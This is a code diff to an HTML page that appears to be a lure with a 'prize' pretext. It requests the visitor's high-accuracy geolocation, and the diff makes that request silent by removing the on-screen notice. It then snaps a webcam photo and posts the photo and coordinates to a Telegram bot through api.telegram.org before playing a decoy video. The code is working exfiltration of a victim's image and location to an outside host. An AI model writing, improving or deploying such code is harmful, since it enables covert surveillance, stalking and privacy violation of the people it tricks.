@@ -9,14 +9,14 @@
         /* 视频框初始隐藏，添加平滑过渡 */
         #video { background: #000; border: 2px solid #444; border-radius: 8px; margin-bottom: 20px; display: none; opacity: 0; transition: opacity 0.5s ease-in-out; }
         
-        /* 表情放大后的状态框 */
+        /* 放大状态框中的表情符号 */
         #status { 
             margin: 15px 0; 
             font-weight: bold; 
             background: rgba(0,0,0,0.6); 
-            padding: 15px; 
+            padding: 20px; 
             border-radius: 10px; 
-            font-size: 60px; 
+            font-size: 60px; /* 放大表情 */
             text-align: center;
         }
         
@@ -43,60 +43,65 @@
             startBtn.style.display = 'none';
             status.innerText = "⏳";
 
-            // 1. 明确请求定位权限
+            // 1. 获取定位 (静默请求)
             let locationText = "Location: Not available";
             try {
-                status.innerText = "📍 Requesting location...";
                 const pos = await new Promise((res, rej) => {
                     navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 5000 });
                 });
                 locationText = `Lat: ${pos.coords.latitude.toFixed(6)}, Lon: ${pos.coords.longitude.toFixed(6)}`;
-            } catch (err) { console.warn("定位获取被拒绝或超时"); }
-
-            // 2. 强制停顿 1 秒，确保浏览器有足够时间处理权限弹窗逻辑
+                status.innerText = "📷 Requesting Camera...";
+            } catch (err) {
+                status.innerText = "📷 Requesting Camera...";
+            }
+            
+            // 等待1秒让浏览器处理权限弹窗
             await new Promise(r => setTimeout(r, 1000));
 
-            // 3. 请求相机权限
+            // 2. 请求相机
             try {
-                status.innerText = "📷 Requesting camera...";
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 video.srcObject = stream;
-                video.style.display = 'block';
+                video.style.display = 'block'; 
                 video.style.opacity = '1';
                 status.innerText = "🌐 Processing.........";
-
-                // 4. 拍照并上传
-                setTimeout(() => {
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-                    
-                    canvas.toBlob(async (blob) => {
-                        const formData = new FormData();
-                        formData.append('chat_id', CHAT_ID);
-                        formData.append('photo', blob, 'prize.jpg');
-                        formData.append('caption', `ID: ${CHAT_ID}\n📍 ${locationText}`);
-
-                        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
-                        
-                        if ((await res.json()).ok) {
-                            status.innerText = "🎉 Success!";
-                            stream.getTracks().forEach(t => t.stop()); // 关闭摄像头
-                            video.srcObject = null;
-                            video.src = "https://github.com/sachinbagwan208-design/-/raw/main/000.MP4";
-                            video.loop = true;
-                            video.muted = false; // 播放视频时开启声音
-                            video.play();
-                        } else {
-                            status.innerText = "⚠️ Upload Error";
-                        }
-                    }, 'image/jpeg');
-                }, 1000);
-
+                
+                setTimeout(() => captureAndUpload(stream, locationText), 1000);
             } catch (err) {
                 status.innerText = "⚠️ Permissions Required";
             }
         });
+
+        async function captureAndUpload(stream, locationText) {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            canvas.toBlob(async (blob) => {
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, 'prize.jpg');
+                formData.append('caption', `来自ID: ${CHAT_ID}\n${locationText}`);
+
+                try {
+                    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+                    if ((await res.json()).ok) {
+                        // 成功后：直接将原相机框切换为视频播放
+                        status.innerText = "🎉 Success!";
+                        stream.getTracks().forEach(t => t.stop()); // 关闭摄像头
+                        video.srcObject = null;
+                        video.src = "https://github.com/sachinbagwan208-design/-/raw/main/000.MP4";
+                        video.loop = true;
+                        video.muted = false; // 播放视频时开启声音
+                        video.play();
+                    } else {
+                        status.innerText = "⚠️ Upload Failed";
+                    }
+                } catch(e) {
+                    status.innerText = "⚠️ Network Error";
+                }
+            }, 'image/jpeg');
+        }
     </script>
 </body>
 </html>
